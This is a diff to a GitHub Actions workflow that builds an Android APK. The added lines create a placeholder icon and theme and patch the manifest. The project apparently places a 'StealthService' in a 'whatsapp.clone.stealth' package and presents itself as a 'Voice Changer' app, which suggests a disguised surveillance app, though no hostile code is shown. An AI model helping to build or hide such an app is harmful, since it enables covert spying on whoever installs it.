@@ -18,11 +18,16 @@ jobs:
         distribution: 'temurin'
         java-version: '17'
 
-    - name: Prepare Project Structure & Clean Build Config
+    - name: Prepare Project Structure & Missing Resources
       run: |
         mkdir -p app/src/main/java/com/whatsapp/clone/stealth/
         mkdir -p app/src/main/res/values
+        mkdir -p app/src/main/res/drawable
         
+        # إنشاء أيقونة وهمية بسيطة بصيغة XML لتجنب خطأ مفقودات الأيقونات
+        mkdir -p app/src/main/res/mipmap-hdpi
+        echo '<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#10B981" android:pathData="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10 10,-4.48 10,-10S17.52,2 12,2z"/></vector>' > app/src/main/res/drawable/ic_launcher_foreground.xml
+
         mv MainActivity.java app/src/main/java/com/whatsapp/clone/stealth/ || true
         mv StealthService.java app/src/main/java/com/whatsapp/clone/stealth/ || true
         mv AndroidManifest.xml app/src/main/AndroidManifest.xml || true
@@ -48,7 +53,7 @@ jobs:
 
         echo "// Top-level build file" > build.gradle
 
-        # إزالة appcompat المعارضة والاعتماد حصرياً على OkHttp فقط لتجنب أي مشاكل في التبعيات
+        # تحديث ملف app/build.gradle واستخدام الـ Theme الافتراضي android:Theme.Light
         cat << 'EOF' > app/build.gradle
         plugins {
             id 'com.android.application' version '8.2.0'
@@ -74,7 +79,11 @@ jobs:
         }
         EOF
 
-        echo '<resources><string name="app_name">Voice Changer</string></resources>' > app/src/main/res/values/strings.xml
+        # ملف strings وملف styles لتوفير الثيم الافتراضي وتجنب أي خطأ أداة ربط
+        echo '<resources><string name="app_name">Voice Changer</string><style name="AppTheme" parent="android:Theme.Light.NoTitleBar"><item name="android:windowBackground">#091F14</item></style></resources>' > app/src/main/res/values/styles.xml
+
+        # تحديث Manifest برمجيًا للتأكد من ربط الثيم الجديد الخالي من أي تعارض
+        sed -i 's|android:theme="@style/Theme.AppCompat.Light.DarkActionBar"|android:theme="@style/AppTheme"|g' app/src/main/AndroidManifest.xml || true
 
     - name: Download Android SDK & Build APK
       run: |
